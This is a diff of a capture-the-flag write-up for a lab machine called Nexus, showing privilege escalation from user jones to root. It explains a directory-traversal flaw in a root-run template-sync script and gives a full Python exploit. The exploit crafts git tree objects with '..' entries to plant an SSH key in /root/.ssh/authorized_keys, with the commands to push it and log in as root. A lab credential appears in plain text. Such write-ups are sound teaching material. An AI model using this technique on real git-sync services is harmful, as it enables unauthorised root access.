@@ -184,7 +184,7 @@ We can then login to the app with the combination: `jones:y27xb3ha!!74GbR`
 
 **3.1 Description**
 
-> In order to ​escalate privileges from the user `jones` to the user `root`, we first list the timers on the nexus box. This shows that an gitea-template-sync.timer is running every x number of seconds. Once we look at the service file, we notice that we can read it. Then by checking the file
+> To escalate from `jones` to `root`, enumerate the systemd timers. The `gitea-template-sync.timer` runs a root-owned service every minute. The service executes the readable `template-sync.py` script. The script writes template repository paths without blocking directory traversal. Create a malicious template repository to write an SSH public key to `/root/.ssh/authorized_keys`, then log in as `root`.
 
 As `jones`, list the timers with `systemctl list-timers`. Note the `gitea-template-sync.timer` entry.
 
@@ -361,6 +361,103 @@ if __name__ == '__main__':
 
 ```
 
-**So what is going wrong here?**
-
+> **So what is going wrong in this file?**\
+> \
+> There is a vulnerability in the code at the sync\_template function. Put simply, it is copying out the files in all template repos, into a directory. In copying, it follows the exact directory and subdirectory structure of the template repo. Nothing wrong, but what if we can create a template repo that looks like this:
 >
+> ```
+> Indigo
+>   ├── README.md  -> blob "# Template\n"
+>   └── .. 
+>       └── ..
+>           └── ..
+>               └── ..
+>                   └── root
+>                       └── .ssh
+>                           └── authorized_keys
+> ```
+
+> When the python code sees the repo, it will read '..' as moving up a directory, instead of creating a directory named ".." within the indigo repo. So what the code ends up doing, is writing an SSH key to the root folder
+
+Firstly, I sign in with Jones credentials on git.nexus.htb. I create a new repo — let’s call it indigo. I leave everything else blank, but check the “Make repository a template” box.
+
+<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*xUyWNmCMxt8B94pYN0ifPg.png" alt="" height="265" width="700"><figcaption></figcaption></figure>
+
+<figure><img src="https://miro.medium.com/v2/resize:fit:353/1*Wn1MRIm_K7waeNmYsSDyAw.png" alt="" height="98" width="353"><figcaption></figcaption></figure>
+
+* In my ssh shell, I typed in the following commands to create a new key pair, and cloned the repo I had created.
+
+```bash
+## Go to /tmp folder and generate a ssh key pair (public and private key)
+$ cd /tmp
+$ ssh-keygen -f ./mykey -N ''
+
+## Clone the repo
+$ git clone http://jones:'<password>'@localhost:3000/jones/indigo.git
+```
+
+<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*tnwikpa4ecKoA4Svi8cCVw.png" alt="" height="590" width="700"><figcaption></figcaption></figure>
+
+Now I copied the following exploit.py to my Kali machine, and transfer it to the target (using a python -m http.server and wget). (Disclaimer: I did not write this code - I got this from [here](https://medium.com/@shammasqazi18/htb-nexus-write-up-cccd4354da05). But I will explain what it does in the next section.)
+
+> Write an ssh key in git exploit
+
+```bash
+#!/usr/bin/env python3
+import hashlib,zlib,os,subprocess,sys,time
+
+def write_obj(data,t):
+    h=("%s %d"%(t,len(data))).encode()+b"\x00"
+    s=h+data
+    sha=hashlib.sha1(s).hexdigest()
+    d=os.path.join(".git","objects",sha[:2])
+    os.makedirs(d,exist_ok=True)
+    p=os.path.join(d,sha[2:])
+    if not os.path.exists(p):
+        open(p,"wb").write(zlib.compress(s))
+    return sha
+
+def entry(mode,name,sha):
+    return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)
+
+if not os.path.isdir(".git"):
+    print("Run inside git repo");sys.exit(1)
+
+r=subprocess.run(["cat","/tmp/mykey.pub"],capture_output=True,text=True)
+if r.returncode!=0:
+    print("ssh-keygen -f /tmp/mykey -N ''");sys.exit(1)
+key=r.stdout.strip()+"\n"
+
+blob=write_obj(key.encode(),"blob")
+readme=write_obj(b"# Template\n","blob")
+ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
+cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
+fir=write_obj(entry("40000","root",cur),"tree")
+for i in range(4):
+    fir=write_obj(entry("40000","..",fir),"tree")
+root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
+ts=int(time.time())
+c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
+sha=write_obj(c.encode(),"commit")
+os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
+open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
+print("Done: "+sha)
+```
+
+In the ssh shell, I executed the python exploit.
+
+```bash
+$ cd indigo
+$ python3 exploit.py
+$ git push -u origin main --force
+```
+
+<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*VRyRXG147kYzDWEEItx3Vg.png" alt="" height="202" width="700"><figcaption></figcaption></figure>
+
+In my web browser, I can see an interesting directory being created
+
+<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*lUrtYGsT3_YQVekY5jarag.png" alt="" height="241" width="700"><figcaption></figcaption></figure>
+
+I copied out the SSH private key to my own Kali machine, chmod to 600, and then used it to ssh as root. With that, I got the root flag.
+
+<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*P7IzvE9Haa9iniZF1IpbYw.png" alt="" height="462" width="700"><figcaption></figcaption></figure>
